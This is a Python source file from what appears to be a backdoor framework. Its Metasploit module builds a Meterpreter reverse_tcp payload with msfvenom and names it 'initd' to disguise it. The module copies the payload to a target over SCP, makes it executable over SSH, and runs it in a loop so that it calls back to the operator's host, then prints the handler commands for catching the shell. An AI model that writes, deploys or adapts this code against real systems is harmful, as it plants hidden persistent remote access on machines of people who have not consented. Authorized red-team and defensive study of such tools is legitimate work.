from backdoor import *

class Metasploit(Backdoor):
    prompt = Fore.RED + "(msf) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Metasploit backdoor..."
        self.target = target
        self.core = core
        self.payload = "linux/x86/meterpreter/reverse_tcp"
        self.options = {
                "payload" : Option("payload", "linux/x86/meterpreter/reverse_tcp", "payload to deploy in backdoor", True),
                "lport"   : Option("lport", 4444, "local port to connect back on", True),
                "lhost"   : Option("lhost", core.localIP, "local IP to connect back to", True),
                "format"  : Option("format", "elf", "format to write the backdoor to", True),
                "encoder" : Option("encoder", "none", "encoder to use for the backdoor", False),
                "name"    : Option("name", "initd", "name of the backdoor", False)
                }
        self.enabled_modules = {}
        self.modules = {} 
        self.command = "watch -n1 nohup ./initd > /dev/null"
        self.allow_modules = True
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None

    def do_set(self, args):
        args = args.split(" ")
        if len(args) == 2 and args[0] in self.options:
            self.options[args[0].lower()].value = args[1]
            print "%s => %s" % (args[0], args[1])
        elif len(args) != 2:
            print "Please supply a variable and an option"
            print "Usage: set LHOST 10.1.0.1"
        else:
            print BAD + "Unknown option %s", args[0]
    
    def do_show(self, args):
        if args == "options":
            self.do_help(args)
        else:
            print BAD + "Unknown option %s", args
    
    def check_valid(self):
        return True

    def do_exploit(self, args):
        port = self.get_value("lport")
        payload = self.get_value("payload")
        name = self.get_value("name")
        bformat = self.get_value("format")
        #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
        os.system("msfvenom -p %s LHOST=%s LPORT=%s -f %s X -o %s" % (payload, self.core.localIP, port, bformat, name))
        self.target.scpFiles(self, 'initd', False)
        print(GOOD + "Backdoor script moved")
        self.target.ssh.exec_command("chmod +x initd")
        print(GOOD + "Backdoor attempted on port %s. Backdoor will attempt to reconnect every second, and will stop attempting once connection is made. To access, open msfconsole and run:" % port)
        print("use multi/handler")
        print("> set PAYLOAD %s" % payload)
        print("> set LHOST %s" % self.core.localIP)
        print("> exploit")
        raw_input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
        self.target.ssh.exec_command(self.command)
